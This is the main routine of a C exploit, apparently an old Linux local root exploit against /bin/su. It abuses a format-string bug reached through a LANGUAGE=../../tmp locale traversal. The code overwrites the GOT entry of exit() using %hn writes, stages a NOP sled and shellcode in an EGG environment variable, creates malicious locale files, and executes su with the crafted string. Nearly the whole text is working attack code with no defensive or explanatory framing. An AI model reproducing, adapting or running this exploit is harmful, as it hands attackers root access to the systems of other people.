int main(int argc, char **argv, char **environ)
{
   unsigned long GOTent;
   char *evilstring, *evilfmt, *payload;
   unsigned int x_num, align=0, retaddy=0xbffffe90;

   if(argc==1) {
      printf("Use as: %s <Number of %%.8x> [align] [ret addy]\n", argv[0]);
      exit(0);
   }

   if(mayRead(FILENAME)) {
      printf("/bin/su is readable - using a GOT overwrite...\n");
      GOTent=getGOT(FILENAME, "exit");
      printf("GOT entry of function exit() at: 0x%lx\n", GOTent);
   } else {
      printf("/bin/su is unreadable - overwriting a return address...\n");
      printf("Not implemented yet... Exiting\n");
      exit(0);
   }

   x_num=atoi(argv[THE_MEANING_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING-41]);
   if(argv[2]) align=atoi(argv[2]);
   if(argv[3]) retaddy=strtoul(argv[3], NULL, 16);

   printf("Using %d %%.8x\n", x_num);
   printf("Using retaddy: 0x%x\n", retaddy);
   printf("Using alignment: %d\n", align);

   /* Put up correct alignment */
   evilstring=strcreat(NULL, "A", align);
   /* First write shortest %hn value */
   evilstring=strcreat(evilstring, longToChar(GOTent+2), 1);
   /* Used as a dummy address for %d incrementation */
   evilstring=strcreat(evilstring, "A", 4);
   /* Write longest %hn value */
   evilstring=strcreat(evilstring, longToChar(GOTent), 1);
   /* And do some post alignment - this is needed! */
   evilstring=strcreat(evilstring, "A", align);

   evilfmt=strcreat(NULL, "%.8x", x_num);
#ifndef THIS_DOES_NOT_DO_ANYTHING_BUT_WHAT_THE_HECK
   evilfmt=strcreat(evilfmt, createDString(retaddy, x_num*8), 1);
#endif

   payload=strcreat(NULL, "EGG=", 1);
   payload=strcreat(payload, "\x90", 500);
   payload=strcreat(payload, hellcode, 1);

   makeEvilFiles(evilfmt);

   /* Create a very select environment in which to function */
   /* This will make guessing the return addy unnecessary */
   environ[0] = strdup("LANGUAGE=sk_SK/../../../../../../tmp");
   environ[1] = payload;
   environ[2] = NULL;

   execl(FILENAME, "Look mommy, I'm a kiddo!", "-u", evilstring, NULL);

   return(0);   /* Not reached */
}